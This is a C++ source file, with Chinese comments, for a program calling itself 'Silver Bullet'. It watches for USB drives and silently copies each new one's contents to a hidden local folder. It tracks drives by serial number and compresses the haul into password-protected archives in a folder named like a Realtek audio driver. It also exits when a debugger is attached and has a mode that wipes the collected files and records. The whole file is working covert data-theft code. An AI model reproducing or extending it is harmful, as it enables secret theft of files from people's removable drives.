#include <iostream>
#include <serialnumber.h>
#include <string>
#include <dir_exist.h>
#include <copy_dir.h> 
#include <file_exist.h>
#include <DeleteFile.h>
#include <vector>
#include <fileio.h>
#include <size.h>
#include <direct.h>
#include <algorithm>
#include <gc.h>
using namespace std;
int main()
{
	
	if (IsDebuggerPresent()) {
		MessageBoxA(NULL, "不要乱搞!!!", "", MB_OK);
		return 0;
	}
	//防止被调试或反汇编
	
	//输入应该以哪种模式启动
	char command[50];
	cin >> command;
	string comparison(command);//transform to string

	//initializing config information
	char buffer[MAX_PATH];
	_getcwd(buffer, MAX_PATH);
	string exepath =  buffer;          //识别当前exe所在路径


	string udisk_dir[4] = { "F:\\","G:\\","H:\\","I:\\" };
	string transpath = exepath + "\\temp\\";
	string zippath = exepath + "\\realtek audio drive\\";
	string recordfile = exepath + "\\serialnum.txt";
	string compressorPath = exepath + "\\7zip\\7z.exe";
	string password = "HowTimeFlies";
	
	//对模式进行判断
	
	if (comparison == "debug") {        //测试模式
		
		cout << "debug start" << endl << endl;
		//测试exe路径是否能够正常识别，及路径是否正确设置
		cout << exepath << transpath << zippath << recordfile;
		
		//1.测试磁盘序列号模块
		cout << "check serial number model" << endl;
		char str[20] = "c:\\";
		DWORD hdnum = serialnum(str);
		cout << "C:\\ serial number is "<< hdnum << endl << endl;
		
		//2.测试复制模块
		cout << "check copy_dir model" << endl;
		string src = exepath + "\\copytest";
		string des = exepath +"\\copytest2";
		copyDir(src, des);
		cout << "Success?\t" << ((exist_test(exepath + "\\copytest2\\1.txt") )? "Yes" : "No") << endl << endl;
		
		//3.测试U盘存在识别模块
		cout << "check dir_exist model" << endl;
		string ZVolume = "Z:\\";
		BOOL ZVolumeExist = CheckFolderExist(ZVolume);
		cout << "Whether Directory Z:\\ exists:\t" << ( ZVolumeExist ? "True" : "False" ) << endl << endl;

		//4.测试文件存在模块
		cout << "check existence judge model" << endl;
		bool existtest = exist_test(exepath + "\\1.vbs");
		cout << (existtest ? "Success" : "Error") << endl << endl;

		//5. 测试文件删除模块
		cout << "check file delete model" << endl;
		DeleteAllFile( (exepath + (string)"\\copytest2\\copytest" ).c_str());
		cout << (CheckFolderExist(exepath + "\\copytest2\\copytest") ? "Error" : "Success") << endl << endl;
		
		//6.测试vector写入输出模块
		cout << "check vector i/o model" << endl;
		vector<vector<int>> ves;
		vector<int> a{ 1, 2, 3 };
		vector<int> b{ 2, 4, 5, 6 };
		ves.push_back(a);
		ves.push_back(b);
		string pathtest(exepath + "\\hello.txt");
		vectorTxt(ves,pathtest);
		vector<vector<int>> vesread = txtVector(pathtest);
		vectorPrint(vesread);
		cout << endl << endl;
		
		//7.测试磁盘剩余空间获取模块
		cout << "check volume size model" << endl;
		char volumesymbol1[20] = "c:\\";
		int volumeleftsize_temp = volumesize(volumesymbol1);
		cout << "C:\\ used space:" << volumeleftsize_temp /1024 /1024 << "GiB" << endl << endl;
		
		//8.测试系统时间
		cout << "check system time model" << endl;
		time_t current1 = time(&current1);
		char buff1[26];
		ctime_s(buff1, sizeof buff1, &current1);
		string buff1_str = buff1;
		cout << "system time is \t" << buff1 << endl;
		
		//9.去除string中不适合用于文件名的非法字符
		string test3 = zippath + "GC " + buff1;
		test3.erase(remove(test3.begin(), test3.end(), '\n'), test3.end());
		test3.erase(remove(test3.begin(), test3.end(), '\t'), test3.end());
		test3.erase(remove(test3.begin(), test3.end(), '\0'), test3.end());
		cout << test3;
		cout << "123" << endl;
		
		//10.测试压缩模块是否有故障
		cout << "testing compressing model" << endl;
		cout << "compressor existence" << exist_test(compressorPath) << endl;
		compress(compressorPath , "D:\\" , exepath + "\\testcompress" ,password);
		GarbageCollection(exepath, transpath, zippath, password);
		cout << "compressing model test done" << endl;
		system("pause");
	}
	else if (comparison == "normal") {        //工作模式
		int i;
		GarbageCollection(exepath , transpath,zippath ,password);
		while (TRUE) {                      //进入检测与复制的死循环
			for (i = 0; i <= 3; i++) {      //进入依次对三个U盘盘符进行复制的循环
				//检测磁盘是否占用过大
				if (volumesize((char*)"D:\\") >= 80 * 1024 * 1024) {
					cout << "D:\\" << "left space is too low" << endl;
					cout << "copy process is being hung" << endl;
					GarbageCollection(exepath, transpath, zippath, password);
					Sleep(60000);
					break;
				}

				bool flagtocopy = true; //是否进行复制的判断标识，True则复制,False则不复制
				cout << "开始识别盘符" << udisk_dir[i] << endl;

				//检测U盘盘符是否存在
				if (!(exist_test(udisk_dir[i]))) {
					flagtocopy = false;
				}

				//对带有特定文件exit.dat的U盘进行豁免
				if (exist_test(udisk_dir[i] + "exit.dat")) {
					flagtocopy = false;
					Sleep(20000);
				}
				//如果该U盘不需要复制那么跳过此次循环
				if (!flagtocopy) {
					cout << udisk_dir[i] << "不存在，是无效盘符,不会被复制" << endl;
					continue;
				}

				vector<vector<int>> comparisons_num_size = txtVector(recordfile);   //从记录文件读取以前复制过的U盘的序列号和大小至vector中
				cout << udisk_dir[i] << "存在，开始查重" << endl;
				int udiskserial = serialnum((char*)(udisk_dir[i]).c_str());         //获取U盘序列号
				int udisksize = volumesize((char*)(udisk_dir[i]).c_str());          //获取U盘大小
				cout << "UdiskSerial:\t" << udiskserial << endl;
				cout << "Udiskspace used:\t" << udisksize << endl;

				//查重模块
				vector<vector<int>>::iterator it;
				bool flag_snum_comparison = false;
				int comparison_size = 0;
				for (it = comparisons_num_size.begin(); it != comparisons_num_size.end(); ++it) {
					if ((*it)[0] == udiskserial) {
						flag_snum_comparison = true;
						comparison_size = (*it)[1];
					}
				}
				if (flag_snum_comparison && (((udisksize - comparison_size) >= -10) || (udisksize - comparison_size) <= 10))
				{
					flagtocopy = false;
				}
				//如果文件夹已经存在，由于复制模块支持比对增量复制，可以继续复制
				if (CheckFolderExist(transpath + to_string(udiskserial))) {
					flagtocopy = true;
				}

				//复制模块
				if (flagtocopy) {
					//复制U盘文件
					string fileNameSerial = to_string(udiskserial);
					copyDir(udisk_dir[i], (transpath + fileNameSerial));
					cout << "查重完成，数据库中未找到该U盘" << udisk_dir[i] << "会被复制" << endl;
					cout << "文件会存在于" << transpath << endl;
					
					//将vector写入记录文件中
					vector<int> tempvec{ udiskserial,udisksize };
					comparisons_num_size.push_back(tempvec);
					vectorTxt(comparisons_num_size, recordfile);
				}
				else
				{
					cout << "查重完成，数据库中已存在该U盘" << udisk_dir[i] << "不会被复制" << endl;
				}
			}
			Sleep(20000);
		}
	}
	else if (comparison == "clear") {         //灰烬模式
		cout << "What do you want to clear?\n" << "1.All\n2.Records\n3.Files\n";
		int input2;
		cin >> input2;
		switch (input2) {
		case 1:
			DeleteAllFile((char*)transpath.c_str());
			DeleteAllFile((char*)zippath.c_str());
			DeleteAFile((char*)recordfile.c_str());
			break;
		case 2:
			DeleteAFile((char*)recordfile.c_str());
			break;
		case 3:
			DeleteAllFile((char*)zippath.c_str());
			DeleteAFile((char*)recordfile.c_str());
			break;
		default:
			cout << "illegal input.\nProgram will exit after 5 seconds.";
			Sleep(5000);
			exit(0);
			break;
		}
	}
	else if (comparison == "compress") {
		GarbageCollection(exepath, transpath, zippath, password);
		cout << "compressing work done" << endl;
		DeleteAFile(recordfile.c_str());
	}
	else if (comparison == "hello") {
		cout << "Nice to meet you." << endl;
		cout << "Version : Silver Bullet 2.0.0 build 20210117 0:41" << endl;
		system("pause");
	}
	else {
		cout << "illegal input.\nProgram will exit after 5 seconds.";
		Sleep(5000);
		exit(0);
	}
	return 0;
}